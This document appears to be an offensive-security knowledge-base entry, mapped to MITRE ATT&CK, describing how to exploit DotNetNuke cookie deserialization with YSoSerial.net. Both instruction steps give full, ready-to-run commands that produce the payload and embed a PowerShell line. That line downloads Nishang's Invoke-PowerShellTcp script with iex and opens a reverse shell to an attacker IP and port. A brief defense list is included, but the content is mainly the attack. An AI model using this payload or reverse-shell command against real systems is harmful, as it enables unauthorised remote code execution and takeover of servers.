---
id: proc-004
tags:
  - deserialization
  - rce
  - powershell
  - reverse-shell
type: procedure
tools:
  - '[[tools/YSoSerial.net]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/ysoserial-dotnetnuke-run-command]]'
  - '[[commands/powershell-reverse-tcp-shell]]'
verified: false
platforms:
  - Windows
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[PowerShell]]'
updated_at: '2025-12-14T17:23:49.744Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[PowerShell]]'
---
# Generate-DNN-RCE-Payload-for-Reverse-Shell

## Summary

This procedure generates a YSoSerial.net payload to execute a PowerShell reverse TCP shell via DNN cookie deserialization, downloading and invoking a Nishang script.

## Description

Using run_command mode, the payload executes PowerShell to download Invoke-PowerShellTcp.ps1 from GitHub and connect back to the attacker's IP:port. This achieves full RCE. Requires listener setup and public attacker IP.

## Requirements

1. YSoSerial.net (Debug build for this example)
2. Internet access on target for script download
3. Attacker IP (e.g., 192.168.1.101) and port 7575

## Defense

Defensive measures and detection strategies:

- Block outbound connections to untrusted IPs/ports
- Disable PowerShell WebClient downloads via AppLocker
- Scan for Nishang scripts in memory or logs

## Objectives

1. Create command execution payload
2. Download and run reverse shell script
3. Establish persistent connection

## Instructions

### Step 1: Generate the Run Command Payload

**Context**: Embed the full PowerShell command in the deserialization gadget.

**Command** ([[commands/ysoserial-dotnetnuke-run-command]]):
```powershell
PS C:\ysoserial.net\ysoserial\bin\Debug> .\ysoserial.exe -p DotNetNuke -m run_command -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.101 -Port 7575"
```

> Produces base64 XML; use in cookie.

### Step 2: Understand Embedded PowerShell Command

**Context**: The -c argument downloads and invokes the shell.

**Command** ([[commands/powershell-reverse-tcp-shell]]):
```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.101 -Port 7575
```

> This is the executed command; expects reverse connection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[PowerShell]]

### Sub-Techniques


## Commands Used

- [[commands/ysoserial-dotnetnuke-run-command]]
- [[commands/powershell-reverse-tcp-shell]]

## Tools Used

- [[tools/YSoSerial.net]]

## Tags

- rce
- powershell
- nishang
